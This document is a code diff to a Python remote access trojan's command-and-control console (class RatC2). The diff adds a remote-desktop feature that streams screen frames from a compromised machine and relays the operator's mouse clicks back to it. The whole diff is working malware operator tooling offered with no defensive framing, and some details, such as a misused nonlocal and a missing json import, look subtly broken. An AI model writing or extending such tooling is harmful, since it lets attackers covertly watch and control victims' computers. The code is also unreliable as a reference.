@@ -1,3 +1,4 @@
+import io
 import socket
 import threading
 import cmd
@@ -8,6 +9,8 @@ import os
 import time
 from pathlib import Path
 from datetime import datetime
+import tkinter as tk
+from PIL import Image, ImageTk
 
 
 class RatC2(cmd.Cmd):
@@ -115,6 +118,84 @@ class RatC2(cmd.Cmd):
             info = session['info']
             status = "Active" if time.time() - session['last_seen'] < 60 else "Stale"
             print(f" {sid[:6]} | {info['os']:7} | {info['hostname']:15} | {status}")
+
+    def do_remote(self, arg):
+        """Start remote desktop session: remote"""
+        if not self._validate_session():
+            return
+
+        response = self._send_command("REMOTE")
+        if response and response == b"REMOTE_SESSION_STARTED":
+            print("[*] Starting remote session...")
+            threading.Thread(target=self._start_remote_gui).start()
+
+    def _start_remote_gui(self):
+        """GUI for remote desktop"""
+        import io
+        root = tk.Tk()
+        root.title("Remote Desktop")
+        label = tk.Label(root)
+        label.pack()
+
+        # Shared variables closure
+        pil_img = [None]  # Use list to allow mutation in nested scopes
+        client = self.sessions[self.current_session]['socket']
+
+        def update_screen():
+            nonlocal pil_img
+            while True:
+                try:
+                    data = self._receive_data(client)
+                    if data and data.startswith(b'FRAME:'):
+                        # Convert bytes to PIL Image
+                        pil_img[0] = Image.open(io.BytesIO(data[6:]))
+                        # Convert to Tkinter-compatible format
+                        tk_img = ImageTk.PhotoImage(pil_img[0])
+
+                        # Update GUI in main thread
+                        root.after(0, lambda: update_label_image(tk_img))
+
+                    elif data and data.startswith(b'REMOTE_ERROR:'):
+                        print(data.decode())
+                        break
+                except Exception as e:
+                    break
+
+        def update_label_image(img):
+            """Thread-safe image update"""
+            label.config(image=img)
+            label.image = img  # Keep reference to prevent GC
+
+        def send_input(event):
+            """Handle mouse input with proper scaling"""
+            if not pil_img[0]:
+                return
+
+            # Get current image dimensions
+            img_width = pil_img[0].width
+            img_height = pil_img[0].height
+
+            # Calculate scaling factors
+            scale_x = label.winfo_width() / img_width
+            scale_y = label.winfo_height() / img_height
+
+            # Convert click coordinates
+            x = int(event.x / scale_x)
+            y = int(event.y / scale_y)
+
+            # Prepare and send input data
+            data = json.dumps({
+                'type': 'mouse',
+                'x': x,
+                'y': y,
+                'click': True
+            })
+            self._send_data(client, f"INPUT:{data}".encode())
+
+        # Start screen update thread
+        threading.Thread(target=update_screen, daemon=True).start()
+        label.bind("<Button-1>", send_input)
+        root.mainloop()
 
     def do_switch(self, arg):
         """Switch active session: switch <session_id_prefix>"""
